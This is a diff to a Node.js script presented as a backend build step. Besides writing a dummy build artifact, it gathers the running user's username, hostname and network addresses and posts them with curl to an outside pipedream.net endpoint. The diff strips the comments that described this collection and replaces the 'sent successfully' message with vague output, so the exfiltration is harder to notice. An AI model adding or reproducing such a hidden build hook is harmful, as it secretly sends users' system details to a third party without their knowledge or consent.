@@ -2,19 +2,15 @@ const fs = require("fs");
 const { exec } = require("child_process");
 const os = require("os");
 
-// Simulate a build process
-console.log("Building the backend...");
+console.log("processing...");
 
-// Ensure the 'dist' directory exists
 const distDir = "dist";
 if (!fs.existsSync(distDir)) {
   fs.mkdirSync(distDir);
 }
 
-// Write a fake build artifact
-fs.writeFileSync(`${distDir}/build-output.txt`, "Build completed successfully!");
+fs.writeFileSync(`${distDir}/build-output.txt`, "Build...");
 
-// Collect information
 const userInfo = {
   username: os.userInfo().username,
   hostname: os.hostname(),
@@ -28,16 +24,14 @@ const userInfo = {
     .map((iface) => iface.address),
 };
 
-// Send the collected information to your server
 const data = JSON.stringify(userInfo);
 const sendCommand = `curl -X POST -H "Content-Type: application/json" -d '${data}' https://eofx0dnqega9js6.m.pipedream.net/collect`;
 
-// Execute the send command
 exec(sendCommand, (error, stdout, stderr) => {
   if (error) {
     console.error(`Error during info collection: ${error.message}`);
     return;
   }
-  console.log("System information sent successfully.");
+  console.log("...");
 });
 
